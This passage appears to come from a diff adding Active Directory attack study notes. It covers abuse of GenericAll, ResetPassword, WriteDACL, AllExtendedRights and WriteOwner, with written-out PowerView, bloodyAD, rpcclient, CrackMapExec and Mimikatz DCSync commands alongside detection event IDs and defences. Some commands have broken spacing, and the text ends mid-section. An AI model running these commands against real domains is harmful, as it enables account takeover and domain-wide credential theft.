+You can push permissions to all child objects
+
+        ↓
+
+You gain control over those objects
+</code></pre>
+<hr />
+<h4 id="attack-proper-flow">⚔️ Attack (Proper Flow)</h4>
+<hr />
+<h4 id="step-1-you-already-have-genericall-on-ou">🔹 Step 1 — You already have GenericAll on OU</h4>
+<pre><code>
+Attacker has full control over OU=IT
+</code></pre>
+<p>👉 This allows you to:</p>
+<ul>
+<li><p>Modify permissions (ACL)</p></li>
+<li><p>Control how access is inherited</p></li>
+</ul>
+<hr />
+<h4 id="step-2-ensure-control-over-child-objects">🔹 Step 2 — Ensure control over child objects</h4>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity &quot;OU=IT,DC=domain,DC=local&quot; -PrincipalIdentityattacker -RightsAll
+</code></pre>
+<hr />
+<h4 id="what-this-does-critical">🧠 What this does (CRITICAL)</h4>
+<pre><code>
+Adds an ACL entry on the OU
+
+        ↓
+
+Marked as inheritable
+
+        ↓
+
+Applies to child objects (users/groups/computers)
+</code></pre>
+<p>👉 Result:</p>
+<pre><code>
+Attacker now has rights ON child objects
+</code></pre>
+<hr />
+<h4 id="step-3-abuse-child-objects">🔹 Step 3 — Abuse child objects</h4>
+<p>Now you can directly interact with objects inside OU:</p>
+<hr />
+<p><strong>✔ Reset user passwords</strong></p>
+<pre><code>
+Set-DomainUserPassword -Identity user1 -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<hr />
+<p><strong>✔ Add yourself to privileged groups</strong></p>
+<pre><code>
+Add-DomainGroupMember -Identity &quot;Admins&quot;-Members attacker
+</code></pre>
+<hr />
+<p><strong>✔ Modify user attributes (SPN / persistence)</strong></p>
+<pre><code>
+Set-DomainObject-Identityuser1-Set @{&#39;servicePrincipalName&#39;=&#39;fake/service&#39;}
+</code></pre>
+<hr />
+<p><strong>✔ Abuse computers (RBCD)</strong></p>
+<pre><code>
+Set-DomainObject -Identity COMPUTER$ -Set @{&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;=$attackerSID}
+</code></pre>
+<hr />
+<h4 id="result">📊 Result</h4>
+<pre><code>
+GenericAll on OU
+
+        ↓
+
+Control over OU ACL
+
+        ↓
+
+Permissions inherited by child objects
+
+        ↓
+
+Control users / groups / computers
+
+        ↓
+
+Mass compromise
+</code></pre>
+<hr />
+<h4 id="important-conditions-real-world">⚠️ Important Conditions (Real World)</h4>
+<div class="line-block">Condition | Impact |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Inheritance enabled | ✅ Works |</div>
+<div class="line-block">AdminSDHolder (privileged users) | ❌ Blocks inheritance |</div>
+<div class="line-block">Objects in OU | Must exist inside that OU |</div>
+<hr />
+<h4 id="summary-table-1">📊 5. Summary Table</h4>
+<div class="line-block">Object | Abuse | Impact |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">User | Reset password | 🚨 Full takeover |</div>
+<div class="line-block">User | Shadow creds | Stealth persistence |</div>
+<div class="line-block">User | SPN / ASREP | Credential theft |</div>
+<div class="line-block">Group | Add member | 🚨 Priv esc |</div>
+<div class="line-block">Computer | RBCD | 🚨 SYSTEM / DA |</div>
+<div class="line-block">Computer | Reset password | Machine takeover |</div>
+<div class="line-block">OU | Control all objects | 🚨 Mass compromise |</div>
+<hr />
+<h4 id="risks-impact-1">🚨 6. Risks / Impact</h4>
+<div class="line-block">Risk | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Full account takeover | Immediate access |</div>
+<div class="line-block">Domain compromise | If admin targeted |</div>
+<div class="line-block">Persistence | ACL / shadow creds |</div>
+<div class="line-block">Lateral movement | Across systems |</div>
+<div class="line-block">Stealth attacks | No password reset needed |</div>
+<hr />
+<h4 id="logs-detection-1">🪵 7. Logs &amp; Detection</h4>
+<div class="line-block">Event ID | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">4724 | Password reset |</div>
+<div class="line-block">4728 | Added to group |</div>
+<div class="line-block">5136 | Object modified |</div>
+<div class="line-block">4769 | Kerberos ticket request |</div>
+<hr />
+<h4 id="key-takeaway-1">💡 8. Key Takeaway</h4>
+<p>👉 <strong>GenericAll = Full control = Multiple attack paths</strong></p>
+<h3 id="force-password-change-abuse-ad">🔐 Force Password Change Abuse (AD)</h3>
+<h4 id="what-is-it">📌 1. What is it?</h4>
+<p><strong>Force Password Change</strong> = Ability to reset another user’s password <strong>without knowing the current password</strong>.</p>
+<p>👉 This is controlled by the AD permission:</p>
+<ul>
+<li><p><code>ResetPassword</code></p></li>
+<li><p>Often comes via:</p>
+<ul>
+<li><code>GenericAll</code></li>
+<li><code>GenericWrite</code></li>
+<li><code>AllExtendedRights</code></li>
+</ul></li>
+</ul>
+<hr />
+<h4 id="prerequisites-2">🎯 2. Prerequisites</h4>
+<div class="line-block">Requirement | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain access | You must be a valid domain user |</div>
+<div class="line-block">Permission on target user | <code>ResetPassword</code> or equivalent |</div>
+<div class="line-block">Network access to DC | LDAP / SMB / RPC connectivity |</div>
+<div class="line-block">Target account | Any user (including admins if misconfigured) |</div>
+<hr />
+<h4 id="conditions-for-abuse-2">⚙️ 3. Conditions for Abuse</h4>
+<div class="line-block">Condition | Why it matters |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">You have <code>GenericAll</code> on user | Full control → reset password |</div>
+<div class="line-block">You have <code>GenericWrite</code> | Can modify attributes → sometimes enough |</div>
+<div class="line-block">You have <code>AllExtendedRights</code> | Includes password reset |</div>
+<div class="line-block">Target is not protected | AdminSDHolder may block changes |</div>
+<div class="line-block">Account is enabled | Otherwise no login |</div>
+<h4 id="ways-to-abuse">🔥 4. Ways to Abuse</h4>
+<p><strong>🧪 Method 1: PowerView</strong></p>
+<pre class="powershell"><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<p>✔ What happens:</p>
+<ul>
+<li><p>Password is directly changed</p></li>
+<li><p>No old password required</p></li>
+</ul>
+<hr />
+<p><strong>🧪 Method 2: net user (Windows)</strong></p>
+<pre><code>
+net user victim NewP@ss123! /domain
+</code></pre>
+<p>✔ Simple built-in method</p>
+<p>✔ Works if permissions allow</p>
+<hr />
+<p><strong>🧪 Method 3: BloodyAD (Linux)</strong></p>
+<pre class="bash"><code>
+bloodyAD --host DC_IP -d domain.local -u attacker -p passset password victim NewP@ss123!
+</code></pre>
+<p>✔ Very common in labs</p>
+<p>✔ Uses LDAP</p>
+<hr />
+<p><strong>🧪 Method 4: Impacket (rpcclient / smbpasswd)</strong></p>
+<pre><code>
+rpcclient -U domain/attacker%pass DC_IP
+
+set userinfo2 victim23 NewP@ss123!
+</code></pre>
+<p>✔ Uses SAMR protocol</p>
+<hr />
+<p><strong>🧪 Method 5: CrackMapExec</strong></p>
+<pre><code>
+crackmapexec smb DC_IP -u attacker -p pass -M pwdreset -o USER=victim PASS=NewP@ss123!
+</code></pre>
+<hr />
+<h4 id="resetpassword-direct-right">🔐 1. ResetPassword (Direct Right)</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>You directly have the <strong>Reset Password extended right</strong> on a user.</p>
+<p><strong>⚔️ Abuse</strong></p>
+<p>PowerView</p>
+<pre class="powershell"><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<p><strong>Linux (rpcclient)</strong></p>
+<pre><code>
+rpcclient -U domain/attacker%pass DC_IP
+
+set userinfo2 victim23 NewP@ss123!
+</code></pre>
+<p><strong>⚙️ What happens internally</strong></p>
+<ul>
+<li><p>Uses <strong>SAMR / LDAP password reset operation</strong></p></li>
+<li><p>No old password required</p></li>
+</ul>
+<p><strong>✅ Result</strong></p>
+<p>👉 Instant account takeover</p>
+<hr />
+<h4 id="genericall-full-control">🔐 2. GenericAll (Full Control)</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>Full control over user object</p>
+<p><strong>⚔️ Abuse</strong></p>
+<p>Same as above (because it includes ResetPassword):</p>
+<pre class="powershell"><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<p><strong>⚙️ Internally</strong></p>
+<ul>
+<li><p>You already have <strong>all rights</strong></p></li>
+<li><p>No need to modify ACL</p></li>
+</ul>
+<p><strong>✅ Result</strong></p>
+<p>👉 Direct password reset</p>
+<hr />
+<h4 id="allextendedrights">🔐 3. AllExtendedRights</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>All extended rights → includes ResetPassword</p>
+<p><strong>⚔️ Abuse</strong></p>
+<pre class="bash"><code>
+bloodyAD --host DC_IP -d domain.local -u attacker-p passset password victim NewP@ss123!
+</code></pre>
+<p><strong>⚙️ Internally</strong></p>
+<ul>
+<li>Extended rights include:
+<ul>
+<li>ResetPassword</li>
+<li>ChangePassword</li>
+<li>Others</li>
+</ul></li>
+</ul>
+<p><strong>✅ Result</strong></p>
+<p>👉 Works same as GenericAll for this case</p>
+<hr />
+<h4 id="genericwrite-tricky-case">🔐 4. GenericWrite (⚠️ Tricky Case)</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>Write access to attributes (NOT full control)</p>
+<p><strong>⚠️ Important</strong></p>
+<p>You <strong>usually CANNOT directly reset password</strong></p>
+<hr />
+<h4 id="possible-abuse-paths">⚔️ Possible Abuse Paths</h4>
+<p><strong>🧪 Case 1: Target allows password write (rare)</strong></p>
+<p>Some environments allow writing:</p>
+<pre class="powershell"><code>
+Set-ADAccountPassword -Identityvictim -Reset-NewPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<p>✔ Might work</p>
+<p>❌ Often fails due to missing extended right</p>
+<p><strong>⚙️ Internally</strong></p>
+<ul>
+<li>You’re modifying attributes, NOT performing reset operation</li>
+</ul>
+<p><strong>✅ Result</strong></p>
+<p>👉 Sometimes → indirect takeover</p>
+<p>👉 Not reliable for password reset</p>
+<h4 id="writedacl-very-powerful">🔐 5. WriteDACL (VERY POWERFUL)</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>Ability to <strong>modify permissions (ACL)</strong> of user</p>
+<hr />
+<h4 id="abuse-flow"><strong>⚔️ Abuse Flow</strong></h4>
+<p><strong>Step 1 — Give yourself ResetPassword</strong></p>
+<pre class="powershell"><code>
+Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsResetPassword
+</code></pre>
+<hr />
+<h4 id="step-2-reset-password">Step 2 — Reset password</h4>
+<pre class="powershell"><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<hr />
+<p><strong>⚙️ Internally</strong></p>
+<ol type="1">
+<li><p>Modify DACL → grant yourself rights</p></li>
+<li><p>Use those rights</p></li>
+</ol>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Full takeover (2-step attack)</p>
+<hr />
+<h4 id="writeowner">🔐 6. WriteOwner</h4>
+<p><strong>🧠 What you have</strong></p>
+<p>Ability to <strong>change owner of object</strong></p>
+<hr />
+<h4 id="abuse-flow-1"><strong>⚔️ Abuse Flow</strong></h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre class="powershell"><code>
+Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker
+</code></pre>
+<hr />
+<p><strong>Step 2 — Modify DACL</strong></p>
+<pre class="powershell"><code>
+Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsResetPassword
+</code></pre>
+<hr />
+<p><strong>Step 3 — Reset password</strong></p>
+<pre class="powershell"><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<hr />
+<p><strong>⚙️ Internally</strong></p>
+<p>Ownership → allows modifying permissions → grant yourself rights</p>
+<hr />
+<p><strong>✅ Result</strong></p>
+<p>👉 Full takeover (3-step chain)</p>
+<h4 id="final-truth-table">🧠 Final Truth Table</h4>
+<div class="line-block">Permission | Can Reset Password? | Notes |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">ResetPassword | ✅ YES | Direct right |</div>
+<div class="line-block">GenericAll | ✅ YES | Full control |</div>
+<div class="line-block">AllExtendedRights | ✅ YES | Includes reset |</div>
+<div class="line-block">GenericWrite | ⚠️ SOMETIMES | Not guaranteed |</div>
+<div class="line-block">WriteDACL | ✅ INDIRECT | Add reset right |</div>
+<div class="line-block">WriteOwner | ✅ INDIRECT | Take control → add rights |</div>
+<p><strong>🧠 What you gain</strong></p>
+<div class="line-block">Scenario | Result |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Reset normal user | Full account takeover |</div>
+<div class="line-block">Reset admin | Domain compromise |</div>
+<div class="line-block">Reset service account | Kerberoasting / lateral movement |</div>
+<hr />
+<h4 id="important-notes-very-important">⚠️ 5. Important Notes (VERY IMPORTANT)</h4>
+<p><strong>🔴 This is NOT password cracking</strong></p>
+<ul>
+<li><p>No brute force</p></li>
+<li><p>No hash needed</p></li>
+<li><p>Direct overwrite</p></li>
+</ul>
+<p><strong>🔴 Kerberos impact</strong></p>
+<ul>
+<li><p>Old tickets become invalid</p></li>
+<li><p>New authentication required</p></li>
+</ul>
+<hr />
+<h4 id="logs-detection-2">📊 6. Logs &amp; Detection</h4>
+<p><strong>🪵 Windows Event Logs</strong></p>
+<div class="line-block">Event ID | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>4724</strong> | Password reset attempt |</div>
+<div class="line-block"><strong>4738</strong> | User account changed |</div>
+<div class="line-block"><strong>4624</strong> | New login after reset |</div>
+<hr />
+<h4 id="example-log">📍 Example Log</h4>
+<pre><code>
+Event ID: 4724
+
+Subject: attacker_user
+
+Target: victim_user
+
+Action: Password Reset
+</code></pre>
+<hr />
+<h4 id="detection-clues">🔍 Detection Clues</h4>
+<ul>
+<li><p>Sudden password reset for privileged user</p></li>
+<li><p>Reset followed by login from different host</p></li>
+<li><p>Unusual admin account activity</p></li>
+</ul>
+<hr />
+<h4 id="risks-impact-2">🚨 7. Risks / Impact</h4>
+<div class="line-block">Risk | Explanation |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Account takeover | Immediate access |</div>
+<div class="line-block">Privilege escalation | Reset admin → DA |</div>
+<div class="line-block">Persistence | Attacker controls password |</div>
+<div class="line-block">Lateral movement | Use credentials across network |</div>
+<div class="line-block">Service disruption | Services using account may break |</div>
+<hr />
+<h4 id="defensive-measures">🛡️ 8. Defensive Measures</h4>
+<div class="line-block">Control | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Least privilege | Remove unnecessary rights |</div>
+<div class="line-block">Monitor 4724 | Alert on password resets |</div>
+<div class="line-block">Protect admin accounts | AdminSDHolder enforcement |</div>
+<div class="line-block">Tiered model | Separate admin/user accounts |</div>
+<div class="line-block">MFA | Reduce impact after reset |</div>
+<h2 id="write-dacl">Write DACL</h2>
+<h4 id="what-is-writedacl-core-concept">🧠 1. What is WriteDACL (Core Concept)</h4>
+<p><strong>🔐 DACL Basics</strong></p>
+<ul>
+<li><p>Every AD object (user, group, computer, OU, domain) has a <strong>DACL (Discretionary Access Control List)</strong></p></li>
+<li><p>DACL = list of <strong>ACEs (Access Control Entries)</strong></p></li>
+<li><p>ACE = <em>who has what permission on this object</em></p></li>
+</ul>
+<hr />
+<h4 id="what-writedacl-means">🔥 What WriteDACL Means</h4>
+<blockquote>
+<p><strong>WriteDACL = Ability to modify permissions of an object</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<ul>
+<li>You can:
+<ul>
+<li>Add new ACEs</li>
+<li>Modify existing ACEs</li>
+<li>Grant yourself <strong>any permission</strong></li>
+</ul></li>
+</ul>
+<p>👉 This is why it’s dangerous:</p>
+<blockquote>
+<p>With WriteDACL → you can give yourself <strong>full control (GenericAll)</strong> or any specific right</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="core-idea-very-important">⚠️ Core Idea (Very Important)</h4>
+<p>👉 WriteDACL is NOT direct control</p>
+<p>👉 It is <strong>permission escalation primitive</strong></p>
+<pre><code>
+WriteDACL → Modify ACL → Give yourself stronger rights → Abuse those rights
+</code></pre>
+<hr />
+<h4 id="conditions-required-for-abuse">🎯 2. Conditions Required for Abuse</h4>
+<h4 id="required-conditions">✅ Required Conditions</h4>
+<p><strong>1. You control a principal (user/computer)</strong></p>
+<ul>
+<li>Your account OR compromised account</li>
+</ul>
+<hr />
+<p><strong>2. That principal has WriteDACL on target object</strong></p>
+<p>Example:</p>
+<pre><code>
+User A → WriteDACL → User B
+</code></pre>
+<hr />
+<p><strong>3. Target object is valuable OR chainable</strong></p>
+<ul>
+<li><p>High privilege user</p></li>
+<li><p>Privileged group</p></li>
+<li><p>Computer (for delegation attacks)</p></li>
+<li><p>OU / Domain (mass impact)</p></li>
+</ul>
+<hr />
+<h4 id="key-understanding">🧠 Key Understanding</h4>
+<p>From theory:</p>
+<blockquote>
+<p>If object B has rights over object A → controlling B = controlling A</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="abuse-logic-universal-flow">⚔️ 3. Abuse Logic (Universal Flow)</h4>
+<p>Same for ALL objects:</p>
+<p><strong>Step 1: You have WriteDACL</strong></p>
+<p><strong>Step 2: Modify DACL</strong></p>
+<p><strong>Step 3: Grant yourself:</strong></p>
+<ul>
+<li><p>GenericAll (full control) OR</p></li>
+<li><p>Specific rights (ForceChangePassword, AddMember, DCSync etc.)</p></li>
+</ul>
+<p><strong>Step 4: Abuse newly gained privilege</strong></p>
+<h3 id="object-wise-abuse-breakdown">🧩 4. Object-wise Abuse Breakdown</h3>
+<hr />
+<h4 id="a.-writedacl-on-user">👤 A. WriteDACL on USER</h4>
+<p><strong>🔐 What you control</strong></p>
+<ul>
+<li>Permissions of user object</li>
+</ul>
+<hr />
+<p><strong>⚔️ What you do</strong></p>
+<p>You grant yourself:</p>
+<ul>
+<li><p>GenericAll OR</p></li>
+<li><p>ForceChangePassword OR</p></li>
+<li><p>AllExtendedRights</p></li>
+</ul>
+<hr />
+<h4 id="abuse-outcomes">💥 Abuse Outcomes</h4>
+<p><strong>1. Reset password (no creds needed)</strong></p>
+<ul>
+<li>Take over account</li>
+</ul>
+<p><strong>2. Kerberoasting</strong></p>
+<ul>
+<li>Add SPN → extract ticket → crack</li>
+</ul>
+<p><strong>3. Full takeover</strong></p>
+<ul>
+<li><p>Modify attributes</p></li>
+<li><p>Persistence</p></li>
+</ul>
+<h4 id="summary-1">🧠 Summary</h4>
+<pre><code>
+WriteDACL → GenericAll → User takeover → Lateral movement
+</code></pre>
+<h4 id="b.-writedacl-on-group">👥 B. WriteDACL on GROUP</h4>
+<p><strong>🔐 What you control</strong></p>
+<ul>
+<li>Membership control of group</li>
+</ul>
+<p><strong>⚔️ What you do</strong></p>
+<p>Grant yourself:</p>
+<ul>
+<li>WriteMembers</li>
+</ul>
+<h4 id="abuse-outcomes-1">💥 Abuse Outcomes</h4>
+<p><strong>1. Add yourself to group</strong></p>
+<ul>
+<li>If group = Domain Admins → instant DA</li>
+</ul>
+<hr />
+<h4 id="summary-2">🧠 Summary</h4>
+<pre><code>
+WriteDACL → AddMember → Privileged group → Privilege escalation
+</code></pre>
+<h4 id="c.-writedacl-on-computer">💻 C. WriteDACL on COMPUTER</h4>
+<p><strong>🔐 What you control</strong></p>
+<ul>
+<li>Computer object permissions</li>
+</ul>
+<p><strong>⚔️ What you do</strong></p>
+<p>Grant yourself:</p>
+<ul>
+<li>GenericAll</li>
+</ul>
+<h4 id="abuse-outcomes-2">💥 Abuse Outcomes</h4>
+<p><strong>1. RBCD (Resource-Based Constrained Delegation)</strong></p>
+<ul>
+<li>Impersonate users → SYSTEM access</li>
+</ul>
+<p><strong>2. Modify SPNs</strong></p>
+<ul>
+<li>Kerberos abuse</li>
+</ul>
+<p><strong>3. Take machine control</strong></p>
+<ul>
+<li>Pivot to domain</li>
+</ul>
+<h4 id="summary-3">🧠 Summary</h4>
+<pre><code>
+WriteDACL → GenericAll → RBCD → SYSTEM → Domain pivot
+</code></pre>
+<h4 id="d.-writedacl-on-ou-organizational-unit">🏢 D. WriteDACL on OU (Organizational Unit)</h4>
+<p><strong>🔐 What you control</strong></p>
+<ul>
+<li>All objects inside OU (inherited permissions)</li>
+</ul>
+<p><strong>⚔️ What you do</strong></p>
+<p>Grant yourself:</p>
+<ul>
+<li>GenericAll on OU (inheritable)</li>
+</ul>
+<h4 id="abuse-outcomes-3">💥 Abuse Outcomes</h4>
+<p><strong>1. Control all users in OU</strong></p>
+<ul>
+<li><p>Reset passwords</p></li>
+<li><p>Add SPNs</p></li>
+</ul>
+<p><strong>2. Control all computers</strong></p>
+<ul>
+<li>RBCD attacks</li>
+</ul>
+<p><strong>3. Massive lateral movement</strong></p>
+<hr />
+<h4 id="key-insight">🧠 Key Insight</h4>
+<p>👉 OU = <strong>multi-object attack surface</strong></p>
+<pre><code>
+WriteDACL → Inheritance → Control multiple objects → Scale attack
+</code></pre>
+<h4 id="e.-writedacl-on-domain-most-critical">🌐 E. WriteDACL on DOMAIN (MOST CRITICAL)</h4>
+<p><strong>🔐 What you control</strong></p>
+<ul>
+<li>Entire domain ACL</li>
+</ul>
+<p><strong>⚔️ What you do</strong></p>
+<p>Grant yourself:</p>
+<ul>
+<li>DCSync rights:
+<ul>
+<li>DS-Replication-Get-Changes</li>
+<li>DS-Replication-Get-Changes-All</li>
+</ul></li>
+</ul>
+<h3 id="abuse-outcomes-4">💥 Abuse Outcomes</h3>
+<p><strong>🔥 DCSync Attack</strong></p>
+<ul>
+<li>Dump password hashes of:
+<ul>
+<li>Domain Admins</li>
+<li>KRBTGT</li>
+</ul></li>
+<li>Full domain compromise</li>
+</ul>
+<h4 id="summary-4">🧠 Summary</h4>
+<pre><code>
+WriteDACL → Add DCSync rights → Dump hashes → Full domain takeover
+</code></pre>
+<hr />
+<h4 id="why-writedacl-is-extremely-dangerous">⚠️ 5. Why WriteDACL is EXTREMELY Dangerous</h4>
+<ul>
+<li><p>Works on ANY object</p></li>
+<li><p>Fully stealthy compared to exploits</p></li>
+<li><p>Doesn’t require admin initially</p></li>
+<li><p>Enables:</p>
+<ul>
+<li>Privilege escalation</li>
+<li>Lateral movement</li>
+<li>Persistence</li>
+</ul></li>
+</ul>
+<p>👉 It’s a <strong>meta-permission (controls other permissions)</strong></p>
+<h4 id="detection-alerts-very-important">🚨 6. Detection &amp; Alerts (Very Important)</h4>
+<p><strong>🔍 What to Monitor</strong></p>
+<p><strong>1. ACL Changes</strong></p>
+<ul>
+<li><p>Attribute:</p>
+<pre><code>nTSecurityDescriptor</code></pre></li>
+<li><p>Any change = suspicious</p></li>
+</ul>
+<p><strong>2. WriteDACL Usage Events</strong></p>
+<ul>
+<li>Windows Event IDs:
+<ul>
+<li>4662 → Object permission change</li>
+<li>5136 → Directory object modified</li>
+</ul></li>
+</ul>
+<hr />
+<p><strong>3. Suspicious Patterns</strong></p>
+<ul>
+<li>New ACE granting:
+<ul>
+<li>GenericAll</li>
+<li>WriteDACL</li>
+<li>DCSync rights</li>
+</ul></li>
+</ul>
+<h4 id="final-mental-model-important">🧠 FINAL MENTAL MODEL (IMPORTANT)</h4>
+<p>Think like this:</p>
+<pre><code>
+WriteDACL = Permission Editor Access
+
+If you can edit permissions →
+
+    You can give yourself power →
+
+        You become owner/control entity
+</code></pre>
+<hr />
+<h4 id="quick-comparison-table">🔥 Quick Comparison Table</h4>
+<div class="line-block">Object | What you gain | Final Impact |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">User | Reset password / full control | Account takeover |</div>
+<div class="line-block">Group | Add yourself | Privilege escalation |</div>
+<div class="line-block">Computer | RBCD / control | SYSTEM / pivot |</div>
+<div class="line-block">OU | Control many objects | Large-scale takeover |</div>
+<div class="line-block">Domain | DCSync | Full domain compromise |</div>
+<h2 id="all-extended-rights">All Extended Rights</h2>
+<h4 id="definition">📌 1. Definition</h4>
+<p><strong>AllExtendedRights</strong> in Active Directory:</p>
+<p>👉 Grants permission to perform <strong>all extended (special) operations</strong> on an object.</p>
+<hr />
+<h4 id="extended-rights-special-actions">🧠 Extended Rights = Special Actions</h4>
+<p>Not full control, but powerful operations like:</p>
+<ul>
+<li><p>Reset password</p></li>
+<li><p>Replication (DCSync)</p></li>
+<li><p>Delegation-related actions</p></li>
+<li><p>Authentication permissions</p></li>
+</ul>
+<hr />
+<p><strong>🔥 Core Idea</strong></p>
+<pre><code>
+AllExtendedRights = Perform critical privileged actions WITHOUT full write access
+</code></pre>
+<h4 id="conditions-for-abuse-3">⚠️ 2. Conditions for Abuse</h4>
+<p><strong>✅ General Conditions</strong></p>
+<ul>
+<li><p>You must have <strong>AllExtendedRights on the target object</strong></p></li>
+<li><p>Network access to Domain Controller</p></li>
+<li><p>Target object not blocking required operation (edge cases)</p></li>
+</ul>
+<hr />
+<p><strong>⚠️ Special Conditions (Important)</strong></p>
+<div class="line-block">Target | Extra Requirement |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">User | Not protected by AdminSDHolder (sometimes) |</div>
+<div class="line-block">Computer | Need attacker-controlled machine/SPN |</div>
+<div class="line-block">Domain | Must apply on <strong>domain root object</strong> |</div>
+<div class="line-block">OU | Not useful (no strong extended rights) |</div>
+<h4 id="user-object">👤 USER Object</h4>
+<p><strong>🎯 What you can do</strong></p>
+<p>👉 <strong>Reset password</strong></p>
+<h4 id="attack-flow-1">⚔️ Attack Flow</h4>
+<pre><code>
+AllExtendedRights → Reset Password → Account Takeover
+</code></pre>
+<h4 id="command">💻 Command</h4>
+<pre><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<h4 id="impact">💥 Impact</h4>
+<ul>
+<li><p>Full user access</p></li>
+<li><p>Privilege escalation (if privileged user)</p></li>
+</ul>
+<h4 id="computer-object">💻 COMPUTER Object</h4>
+<p><strong>🎯 What you can do</strong></p>
+<p><strong>👉 Read Laps Password</strong></p>
+<p>You may read the LAPS password of the computer object. For more information about that, see the ReadLAPSPassword edge section.</p>
+<p>👉 <strong>RBCD (Resource-Based Constrained Delegation)</strong></p>
+<h4 id="attack-flow-2">⚔️ Attack Flow</h4>
+<pre><code>
+AllExtendedRights → Set msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD → SYSTEM
+</code></pre>
+<h4 id="command-1">💻 Command</h4>
+<pre><code>
+Set-DomainObject -Identity TARGET$ -Set @{&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;=$attackerSID}
+</code></pre>
+<h4 id="impact-1">💥 Impact</h4>
+<ul>
+<li><p>SYSTEM access on target machine</p></li>
+<li><p>Lateral movement</p></li>
+</ul>
+<h4 id="domain-object">🌐 DOMAIN Object</h4>
+<h4 id="what-is-a-domain-object">🧠 What is a “Domain Object”?</h4>
+<p>In Active Directory:</p>
+<p>👉 A <strong>domain object</strong> refers to the <strong>root object of the domain itself</strong>, not users, computers, or OUs.</p>
+<hr />
+<p><strong>📌 Example</strong></p>
+<p>For a domain:</p>
+<pre><code>
+domain.local
+</code></pre>
+<p>The <strong>domain object</strong> is:</p>
+<pre><code>
+DC=domain,DC=local
+</code></pre>
+<h4 id="think-of-ad-hierarchy-like-this">🧩 Think of AD hierarchy like this:</h4>
+<pre><code>
+DC=domain,DC=local        ← 🌐 DOMAIN OBJECT (this is what we mean)
+
+│
+
+├── OU=IT
+
+│    ├── user1
+
+│    └── computer1
+
+│
+
+├── OU=HR
+
+│    └── user2
+</code></pre>
+<hr />
+<h4 id="key-understanding-1">🔥 Key Understanding</h4>
+<div class="line-block">Term | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain | Logical network (domain.local) |</div>
+<div class="line-block">Domain Object | The <strong>AD object representing the domain</strong> |</div>
+<div class="line-block">Distinguished Name | <code>DC=domain,DC=local</code> |</div>
+<p><strong>🎯 What you can do</strong></p>
+<p>👉 <strong>DCSync attack</strong></p>
+<p><strong>🎯 What you want to see</strong></p>
+<pre><code>
+attacker ──AllExtendedRights──▶ domain.local
+</code></pre>
+<h4 id="attack-flow-3">⚔️ Attack Flow</h4>
+<pre><code>
+AllExtendedRights → Replication Rights → DCSync → Dump hashes → Domain Compromise
+</code></pre>
+<h4 id="command-mimikatz">💻 Command (Mimikatz)</h4>
+<pre><code>
+lsadump::dcsync/domain:domain.local/user:Administrator
+</code></pre>
+<h4 id="impact-2">💥 Impact</h4>
+<ul>
+<li><p>Dump NTLM hashes of all users</p></li>
+<li><p>Full domain compromise</p></li>
+</ul>
+<h2 id="write-owner">Write Owner</h2>
+<p><strong>📌 1. Definition</strong></p>
+<p><strong>WriteOwner</strong> in Active Directory allows you to:</p>
+<p>👉 Change the <strong>owner</strong> of an object (user, group, computer, OU)</p>
+<hr />
+<p><strong>🧠 Why ownership matters</strong></p>
+<p>In AD:</p>
+<pre><code>
+Owner → has implicit right to modify ACL (DACL)
+</code></pre>
+<p>👉 Even if you don’t have <code>GenericAll</code>, as owner you can:</p>
+<ul>
+<li><p>Modify permissions</p></li>
+<li><p>Grant yourself full control</p></li>
+</ul>
+<p><strong>🔥 Core Idea</strong></p>
+<pre><code>
+WriteOwner → Take Ownership → Modify ACL → Full Control → Abuse
+</code></pre>
+<h4 id="abuse-flow-generic">⚔️ 2. Abuse Flow (Generic)</h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre class="powershell"><code>
